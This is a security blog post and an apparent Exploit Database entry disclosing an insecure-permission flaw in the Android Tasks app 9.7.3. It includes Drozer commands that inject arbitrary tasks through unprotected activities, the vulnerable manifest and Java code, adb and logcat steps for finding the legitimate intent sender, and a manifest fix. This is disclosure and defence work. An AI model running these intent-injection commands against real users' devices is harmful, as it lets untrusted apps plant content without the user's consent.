# How White-Box hacking works: “Ok, Google, I wanna pwn this app….”

July 18, 2020
  |  [No Comments](https://lyhinslab.org/index.php/2020/07/18/how-the-white-box-hacking-works-ok-google-i-wanna-pwn-this-app/#respond)

Mobile applications should not trust other applications on the device.

The new generation likes it when an organization wants them to use lightweight mobile devices instead of PCs. In this case, employees don’t spend time and efforts walking around the room to find that single machine with Windows XP in the left corner of the room and to wait until it boots, unlags, and proceeds… People are use to carrying phones or tablets and send messages to each other all the time. Finally, a tablet usually is significantly less expensive, than a PC or a laptop, that increases efficiency.

However, who and how can control those devices? Particularly, a new tablet would have dozens of applications installed during the next months. Thus, dozens of different groups of people can legally execute code on your devices in your network and **might sell this right legally.** How many attack vectors can you count if an organization has hundreds of devices, and each application can get to any device including the router within the network? How would you protect your people and your networks against these attacks? Finally, what if you **do not own** all the devices in your network, **how would you ask**your employees to protect themselves and the perimeter? Hard questions, solvable in hours of consultations, but the basic advice is**do not trust applications**. This also works if you have your own application, you have a large base of users and plan to have more, you work with PII, and do not want to violate privacy laws like CCPA or GDPR.

### Typical exploit case

To better understand the threat, we highly recommend to repeat the next attack manually on a device.

#### Target posture

“Astrid Tasks” is an open-source application, that flourished before Yahoo bought the app and was discontinued in 2013. Then, Alex Baker found open-source parts of the app and decided to resurrect it. As for July 2020, the application is completely free with no ads, has more than 1000 stars on Github and more than 5000 active users. Thus, Lyhin’s Lab decided to slightly improve the security of the “Tasks” application. Current app version is 9.7.3.

#### Bug discovery

Even though the “Tasks” application returns to life at a very early stage, this application has a couple of interesting possibilities – particularly, the integration with “Ok, Google” service.

Unfortunately, the “VoiceCommandActivity” application component allows arbitrary applications on a device to add tasks with no restrictions.

```
dz> run app.activity.start --component org.tasks.debug org.tasks.voice.VoiceCommandActivity --action=com.google.android.gm.action.AUTO_SEND --extra string android.intent.extra.TEXT "Super Important Task: visit my website https://lyhinslab.org"
```

Activity representation:

app/src/main/AndroidManifest.xml

```
<activity
      android:name=".voice.VoiceCommandActivity"
      android:theme="@style/TranslucentDialog">
      <intent-filter>
        <action android:name="com.google.android.gm.action.AUTO_SEND"/>

        <category android:name="android.intent.category.DEFAULT"/>
        <data android:mimeType="text/plain"/>
      </intent-filter>
    </activity>
```

Activity implementation:

org/tasks/voice/VoiceCommandActivity.java

```
 public class VoiceCommandActivity extends InjectingAppCompatActivity {

  @Inject TaskCreator taskCreator;
  @Inject @ForApplication Context context;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent intent = getIntent();
      if ("com.google.android.gm.action.AUTO_SEND".equals(intent.getAction())) {
      final String text = intent.getStringExtra(Intent.EXTRA_TEXT);
      if (!isNullOrEmpty(text)) {
        taskCreator.basicQuickAddTask(text);
        Toast.makeText(context, getString(R.string.voice_command_added_task), Toast.LENGTH_LONG)
            .show();
      }
      finish();
    }
  }

  @Override
  public void inject(ActivityComponent component) {
    component.inject(this);
  }
}
```
#### How to repair

In the Android world, components like activities may require permissions. Thus, we could find a permission that a trusted application has, but an untrusted application cannot have. Notice, that sometimes it’s not possible to find such permission, and, generally speaking, android components cannot easily get the actual sender of the intent in runtime in a secure way.

The activity representation states that the activity action is:

```
com.google.android.gm.action.AUTO_SEND
```

As for today, an official guide on developer.android.com says nothing about integration with “Ok, Google” functionality on tablets. But the Internet has traces of the next signature level permission:

```
com.google.android.gm.permission.AUTO_SEND
```

Because of the signature level permissions design, com.google.android.gm.permission.AUTO\_SEND permission could be obtained by those applications only that were signed by the same signature Gmail application was signed. If the legal “Ok, Google” intent sender has this permission, VoiceCommandActivity should require com.google.android.gm.permission.AUTO\_SEND permission to be secure. Follow the next steps to detect the package that sends intents and to ensure that this application has “com.google.android.gm.permission.AUTO\_SEND” permission.

1. Clear logcat, and start log inspecting

```
adb shell
su
logcat -c
logcat
```

2. Add a new task with “Ok, Google” functionality manually

3. Find the right place in logs. Some application sends an intent to VoiceCommandActivity

![](https://lyhinslab.org/wp-content/uploads/2020/07/image-9.png)

4. Find the package with the right UID

```
cat /data/system/packages.list | grep 10033
```
![](https://lyhinslab.org/wp-content/uploads/2020/07/image-3.png)

The package is:

```
com.google.android.googlequicksearchbox
```

5. Inspect the package permissions.

```
dumpsys package com.google.android.googlequicksearchbox | grep "com.google.android.gm.permission.AUTO_SEND" -C20 --color
```
![](https://lyhinslab.org/wp-content/uploads/2020/07/image-4.png)

This package has the right permission.

#### Fix

Repair the VoiceCommandActivity activity representation in manifest. Before:

```
<activity
      android:name=".voice.VoiceCommandActivity"
      android:theme="@style/TranslucentDialog">

      <intent-filter>

        <action android:name="com.google.android.gm.action.AUTO_SEND"/>

        <category android:name="android.intent.category.DEFAULT"/>
        <data android:mimeType="text/plain"/>
      </intent-filter>
    </activity>
```

After:

```
<activity
      android:name=".voice.VoiceCommandActivity"
      android:theme="@style/TranslucentDialog"
      android:permission="com.google.android.gm.permission.AUTO_SEND">

      <intent-filter>

        <action android:name="com.google.android.gm.action.AUTO_SEND"/>

        <category android:name="android.intent.category.DEFAULT"/>
        <data android:mimeType="text/plain"/>
      </intent-filter>
    </activity>
```

Result:

Permission denial

Permission denial for Drozer, while the legal functionality works fine. Looks super easy, requires hours of reseach to understand, at least for the regular people like we are.

#### Conclusion

We recommend to “Tasks” application maintainers to enforce the VoiceCommandActivity to require com.google.android.gm.permission.AUTO\_SEND permission. We notified Alex on a vulnerability about two months ago and unfortunately got no reaction, so it’s time to disclose the vulnerability now. Code changes are above.

UPD July 23. Changes had been commited to the official repository, so the vulnerability is fixed.

The possible future of well-growing companies brings new people and new devices, and new risks with them. On the other side, how about medium-sized companies today? How many unique small applications can access the internal infrastructure of a regular company? Easy to calculate, hard to mitigate.

Nowadays, a lot of issues discovered during mobile security application assessments contain permission related vulnerabilities, reasonably – in the mobile world, developers should use controls that the platform offers. Assess android permissions respectfully, verify permissions for exported components, stay safe yourself, and protect your assets.

*LL advises to all the researchers do not break real applications* *illegally. This fun leads to broken businesses and lives, and, most likely, will not make an attacker really rich.*

# Exploit Title: Tasks 9.7.3 - Insecure Permissions
# Date: 18th of July, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/07/18/how-the-white-box-hacking-works-ok-google-i-wanna-pwn-this-app/
# Vendor Homepage: https://tasks.org/
# Software Link: https://github.com/tasks/tasks
# Version: 9.7.3
# Tested on: Android 9

Any installed application on a victim's phone can add arbitrary tasks to users through insecure IPC handling.
A malicious application has several ways of how to achieve that:

1. By sending multiple intents to ShareLink activity (com/todoroo/astrid/activity/ShareLinkActivity.java). Tasks application adds the first requested "task" to the user's task list.

2. By sending an intent to VoiceCommand activity (org/tasks/voice/VoiceCommandActivity.java). The application does not validate intent's origin, so any application can append tasks to the user's task list.

We used the Drozer application to emulate malicious app activity. Please find the commands below.

run app.activity.start --component org.tasks.debug com.todoroo.astrid.activity.ShareLinkActivity --action=android.intent.action.PROCESS_TEXT --extra string android.intent.extra.PROCESS_TEXT "Kill Mufasa"
run app.activity.start --component org.tasks.debug org.tasks.voice.VoiceCommandActivity --action=com.google.android.gm.action.AUTO_SEND --extra string android.intent.extra.TEXT "Visit https://lyhinslab.org"

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
